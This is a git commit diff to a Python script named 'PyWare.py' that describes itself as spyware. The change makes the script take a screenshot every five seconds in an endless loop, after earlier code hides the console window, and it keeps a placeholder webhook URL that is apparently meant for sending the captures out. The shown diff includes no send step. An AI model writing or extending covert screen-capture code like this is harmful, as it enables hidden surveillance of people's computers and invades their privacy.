493ffe3af4955c835250639a549aede783fd0163
Zach <100164907@ccisd.net>
2025-08-18 08:09:29 -0500

    Now Takes Screenshots every 5 seconds

--- PyWare.py
+++ PyWare.py
@@ -6,13 +6,17 @@ import pyautogui
 import ctypes
 
 Webhook_url = "https://example.com"
+Screenshot_Num = 1
 print("--PyWare--")
 Run = input("This is SPYWARE are you sure you want to run? Y/N | ")
 if Run.upper() == "Y":
     Confirm = input("Are you POSITIVE you want to run this? Y/N | ")
     if Confirm.upper() == "Y":
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-        screenshot = pyautogui.screenshot()
+        while True:
+          screenshot = pyautogui.screenshot()
+          time.sleep(5)
+          Screenshot_Num = Screenshot_Num + 1
     elif Confirm.upper() == "N":
         os.system('cls')
         print("Closing program please wait...")
